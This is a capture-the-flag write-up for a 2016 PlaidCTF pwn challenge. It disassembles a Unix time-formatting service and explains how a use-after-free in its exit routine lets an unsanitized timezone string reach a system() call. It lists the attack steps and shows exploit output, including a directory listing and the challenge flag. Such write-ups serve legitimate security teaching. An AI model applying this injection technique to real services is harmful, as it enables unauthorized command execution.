
##  PlaidCTF 2016 - unix time formatter (Pwn 76)
##### 15/04 - 17/02/2016 (48hr)
___
### Description: 
Converting Unix time to a date is hard, so Mary wrote a tool to do so.

Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999
___
### Solution
Let's start our analysis from main():

```assembly
.text:00400A70                   main_400A70 proc near
.text:00400A70 51                    push    rcx
.....
.text:00400A9B                   LOOP_400A9B:                            ; CODE XREF: main_400A70+84
.....
.text:00400AEA E8 37 02 00 00        call    read_int_400D26
.text:00400AEF FF C8                 dec     eax
.text:00400AF1 83 F8 04              cmp     eax, 4                      ; switch 5 cases
.text:00400AF4 77 A5                 ja      short LOOP_400A9B           ; jumptable 00400AF6 default case
.text:00400AF6 FF 24 C5 C0 12 40+    jmp     ds:off_4012C0[rax*8]        ; switch jump
.text:00400AFD                   ; ---------------------------------------------------------------------------
.text:00400AFD
.text:00400AFD                   loc_400AFD:                             ; CODE XREF: main_400A70+86j
.text:00400AFD                                                           ; DATA XREF: .rodata:off_4012C0o
.text:00400AFD E8 FE 02 00 00        call    set_format_400E00           ; jumptable 00400AF6 case 0
.text:00400B02 EB 1A                 jmp     short loc_400B1E
.text:00400B04                   ; ---------------------------------------------------------------------------
.text:00400B04
.text:00400B04                   loc_400B04:                             ; CODE XREF: main_400A70+86j
.text:00400B04                                                           ; DATA XREF: .rodata:off_4012C0o
.text:00400B04 E8 5A 03 00 00        call    set_time_400E63             ; jumptable 00400AF6 case 1
.text:00400B09 EB 13                 jmp     short loc_400B1E
.text:00400B0B                   ; ---------------------------------------------------------------------------
.text:00400B0B
.text:00400B0B                   loc_400B0B:                             ; CODE XREF: main_400A70+86j
.text:00400B0B                                                           ; DATA XREF: .rodata:off_4012C0o
.text:00400B0B E8 33 03 00 00        call    set_timezone_400E43         ; jumptable 00400AF6 case 2
.text:00400B10 EB 0C                 jmp     short loc_400B1E
.text:00400B12                   ; ---------------------------------------------------------------------------
.text:00400B12
.text:00400B12                   loc_400B12:                             ; CODE XREF: main_400A70+86j
.text:00400B12                                                           ; DATA XREF: .rodata:off_4012C0o
.text:00400B12 E8 8C 03 00 00        call    print_time_400EA3           ; jumptable 00400AF6 case 3
.text:00400B17 EB 05                 jmp     short loc_400B1E
.text:00400B19                   ; ---------------------------------------------------------------------------
.text:00400B19
.text:00400B19                   loc_400B19:                             ; CODE XREF: main_400A70+86j
.text:00400B19                                                           ; DATA XREF: .rodata:off_4012C0o
.text:00400B19 E8 71 04 00 00        call    exit_400F8F                 ; jumptable 00400AF6 case 4
.text:00400B1E
.text:00400B1E                   loc_400B1E:                             ; CODE XREF: main_400A70+92j
.text:00400B1E                                                           ; main_400A70+99j ...
.text:00400B1E 85 C0                 test    eax, eax
.text:00400B20 0F 84 75 FF FF FF     jz      LOOP_400A9B                 ; jumptable 00400AF6 default case
.text:00400B26 31 C0                 xor     eax, eax
.text:00400B28 5A                    pop     rdx
.text:00400B29 C3                    retn
.text:00400B29                   main_400A70 endp
```

Pretty easy right? The key function here is read_str() (0x00400D74) which reads a string
from and stores it on the stack (no overflows). Then it calls dup_str() (0x00400C26) to
copy it on the heap (strdup() is used internally):
```assembly
	.text:00400C2C E8 2F FE FF FF        call    _strdup                 ; duplicate string
```
Next is the set_format():
```assembly
.text:00400E00                   set_format_400E00 proc near             ; CODE XREF: 
.text:00400E00 53                    push    rbx
.text:00400E01 BF 12 11 40 00        mov     edi, offset aFormat         ; "Format: "
.text:00400E06 E8 69 FF FF FF        call    read_str_400D74
.text:00400E0B 48 89 C7              mov     rdi, rax                    ; s
.text:00400E0E 48 89 C3              mov     rbx, rax
.text:00400E11 E8 9F FE FF FF        call    check_format_400CB5
.text:00400E16 85 C0                 test    eax, eax
.text:00400E18 75 14                 jnz     short loc_400E2E
.text:00400E1A BF 1B 11 40 00        mov     edi, offset s               ; "Format contains invalid characters."
.text:00400E1F E8 2C FB FF FF        call    _puts
.text:00400E24 48 89 DF              mov     rdi, rbx
.text:00400E27 E8 52 FE FF FF        call    debug_n_free_400C7E
.text:00400E2C EB 11                 jmp     short loc_400E3F
.....
.text:00400E42                   set_format_400E00 endp
```
The check_format() (0x00400cb5) scans the input string looking for whitelist characters:
 %aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^#. So, we can't bypass this filter.

set_time() and set_timezone() are easy too:
```assembly
.text:00400E63                   set_time_400E63 proc near               ; CODE XREF:
.text:00400E63 51                    push    rcx
.text:00400E64 BE 66 11 40 00        mov     esi, offset aEnterYourUnixT ; "Enter your unix time: "
.text:00400E69 BF 01 00 00 00        mov     edi, 1
.text:00400E6E 31 C0                 xor     eax, eax
.text:00400E70 E8 BB FB FF FF        call    ___printf_chk
.text:00400E75 48 8B 3D 64 12 20+    mov     rdi, cs:stdout              ; stream
.text:00400E7C E8 8F FB FF FF        call    _fflush
.text:00400E81 E8 A0 FE FF FF        call    read_int_400D26
.text:00400E86 85 C0                 test    eax, eax
.text:00400E88 BF 7D 11 40 00        mov     edi, offset aUnixTimeMustBe ; "Unix time must be positive"
.text:00400E8D 78 0B                 js      short loc_400E9A
.text:00400E8F 89 05 8B 12 20 00     mov     cs:time_602120, eax
.text:00400E95 BF 98 11 40 00        mov     edi, offset aTimeSet_       ; "Time set."
.text:00400E9A
.....
.text:00400EA2                   set_time_400E63 endp

.text:00400E43                   set_timezone_400E43 proc near           ; CODE XREF: 
.text:00400E43 50                    push    rax
.text:00400E44 BF 4B 11 40 00        mov     edi, offset aTimeZone       ; "Time zone: "
.text:00400E49 E8 26 FF FF FF        call    read_str_400D74
.text:00400E4E BF 57 11 40 00        mov     edi, offset aTimeZoneSet_   ; "Time zone set."
.text:00400E53 48 89 05 B6 12 20+    mov     cs:timezone_value, rax
.text:00400E5A E8 F1 FA FF FF        call    _puts
.text:00400E5F 31 C0                 xor     eax, eax
.text:00400E61 5A                    pop     rdx
.text:00400E62 C3                    retn
.text:00400E62                   set_timezone_400E43 endp
```
So what's going on so far? We can set time, timezone and format. All these are stored on the
heap and there are 3 global pointers pointing to them. The interesting part starts on print_time():

```assembly
.text:00400EA3      print_time_400EA3 proc near             ; CODE XREF: main_400A70:loc_400B12p
.text:00400EA3
.....
.text:00400EBD 48 8B 05 54 12 20+    mov     rax, cs:time_format_602118
.text:00400EC4 48 85 C0              test    rax, rax
.text:00400EC7 75 0F                 jnz     short loc_400ED8
.text:00400EC9 BF A2 11 40 00        mov     edi, offset aYouHavenTSpeci ; "You haven't specified a format!"
.....
.text:00400ED8                   loc_400ED8:                             ; CODE XREF: 
.text:00400ED8 52                    push    rdx
.text:00400ED9 50                    push    rax
.text:00400EDA B9 00 08 00 00        mov     ecx, 800h
.text:00400EDF 44 8B 0D 3A 12 20+    mov     r9d, cs:time_602120
.text:00400EE6 41 B8 C2 11 40 00     mov     r8d, offset aBinDateD@DS    ; "/bin/date -d @%d +'%s'"
.text:00400EEC BA 01 00 00 00        mov     edx, 1
.text:00400EF1 48 8D 7C 24 18        lea     rdi, [rsp+828h+command]
.text:00400EF6 BE 00 08 00 00        mov     esi, 800h
.text:00400EFB 31 C0                 xor     eax, eax
.text:00400EFD E8 2E FA FF FF        call    ___snprintf_chk
.text:00400F02 BE D9 11 40 00        mov     esi, offset aYourFormattedT ; "Your formatted time is: "
.text:00400F07 BF 01 00 00 00        mov     edi, 1
.text:00400F0C 31 C0                 xor     eax, eax
.text:00400F0E E8 1D FB FF FF        call    ___printf_chk
.text:00400F13 48 8B 3D C6 11 20+    mov     rdi, cs:stdout              ; stream
.text:00400F1A E8 F1 FA FF FF        call    _fflush
.text:00400F1F BF BB 10 40 00        mov     edi, offset name            ; "DEBUG"
.text:00400F24 E8 F7 F9 FF FF        call    _getenv
.text:00400F29 48 85 C0              test    rax, rax
.text:00400F2C 59                    pop     rcx
.text:00400F2D 5E                    pop     rsi
.text:00400F2E 74 1D                 jz      short DEBUG_NOT_SET_400F4D
.text:00400F30 48 8B 3D C9 11 20+    mov     rdi, cs:stderr
.text:00400F37 48 8D 4C 24 08        lea     rcx, [rsp+818h+command]
.text:00400F3C BA F2 11 40 00        mov     edx, offset aRunningCommand ; "Running command: %s\n"
.text:00400F41 BE 01 00 00 00        mov     esi, 1
.text:00400F46 31 C0                 xor     eax, eax
.text:00400F48 E8 03 FB FF FF        call    ___fprintf_chk
.text:00400F4D
.text:00400F4D                   DEBUG_NOT_SET_400F4D:                   ; CODE XREF:
.text:00400F4D 48 8B 35 BC 11 20+    mov     rsi, cs:timezone_value      ; value
.text:00400F54 BF 07 12 40 00        mov     edi, offset aTz             ; "TZ"
.text:00400F59 BA 01 00 00 00        mov     edx, 1                      ; replace
.text:00400F5E E8 FD F9 FF FF        call    _setenv
.text:00400F63 48 8D 7C 24 08        lea     rdi, [rsp+818h+command]     ; command
.text:00400F68 E8 33 FA FF FF        call    _system
.text:00400F6D
.....
.text:00400F8E                   print_time_400EA3 endp
```

My first thought was a shellsock in TZ env variable. However it didn't work. But the command 
injection idea is nice. At the end we call system("/bin/date -d @%d +'%s'"). We can control
%d and %s, which is sanitized. So a direct command injection doesn't work.

The final piece of the puzzle is exit():
```assembly
.text:00400F8F                   exit_400F8F proc near                   ; CODE XREF:
.text:00400F8F
.text:00400F8F 48 83 EC 28           sub     rsp, 28h
.text:00400F93 48 8B 3D 7E 11 20+    mov     rdi, cs:time_format_602118
.text:00400F9A 64 48 8B 04 25 28+    mov     rax, fs:28h
.text:00400FA3 48 89 44 24 18        mov     [rsp+28h+var_10], rax
.text:00400FA8 31 C0                 xor     eax, eax
.text:00400FAA E8 CF FC FF FF        call    debug_n_free_400C7E
.text:00400FAF 48 8B 3D 5A 11 20+    mov     rdi, cs:timezone_value
.text:00400FB6 E8 C3 FC FF FF        call    debug_n_free_400C7E
.text:00400FBB BE 0A 12 40 00        mov     esi, offset aAreYouSureYouW ; "Are you sure you want to exit (y/N)? "
.....
.text:00401024 C3                    retn
.text:00401024                   exit_400F8F endp
```

As you can see here we first free (debug_n_free_400C7E takes a pointer as an argument and frees it)
the timezone and time_format buffers, and then we ask user if he really wants to exit. If the user
answer no, program will return to the main loop, but the pointers will be stale.

We can do a UAF attack as follows:
```
	[1]. We allocate a buffer for format string and we set a bogus format

	[2]. We free this memory leaving the time_format_602118 stale

	[3]. We allocate a new timezone with size as large as the previous format string and we 
	     write our injected command.

	[4]. We print the time and trigger the UAF. time_format_602118 will point to the timezone
	     string in the heap, which is not sanitized and contains our command.

	[5]. We get the flag: PCTF{use_after_free_isnt_so_bad}
```


By running the exploit we can get our flag:

```
root@nogirl:~/ctf/plaidctf# ./unix_time_format_expl.py 
	Your formatted time is: QQQQ
	total 40
	drwxr-xr-x 2 root    root     4096 Apr 16 15:03 .
	drwxr-xr-x 4 root    root     4096 Apr 16 14:58 ..
	-rw-r--r-- 1 problem problem   220 Apr 16 14:58 .bash_logout
	-rw-r--r-- 1 problem problem  3771 Apr 16 14:58 .bashrc
	-rw-r--r-- 1 problem problem   675 Apr 16 14:58 .profile
	-rw-r--r-- 1 root    root       33 Apr 16 15:01 flag.txt
	-rwxr-xr-x 1 root    root    10488 Apr 16 14:58 unix_time_formatter
	-rwxr-xr-x 1 root    root      229 Apr 16 15:02 wrapper
	1) Set a time format.
	2) Set a time.
	3) Set a time zone.
	4) Print your time.
	5) Exit.
	> 
	
root@nogirl:~/ctf/plaidctf# ./unix_time_format_expl.py 
	Your formatted time is: QQQQ
	PCTF{use_after_free_isnt_so_bad}
	1) Set a time format.
	2) Set a time.
	3) Set a time zone.
	4) Print your time.
	5) Exit.
	> 
```
___
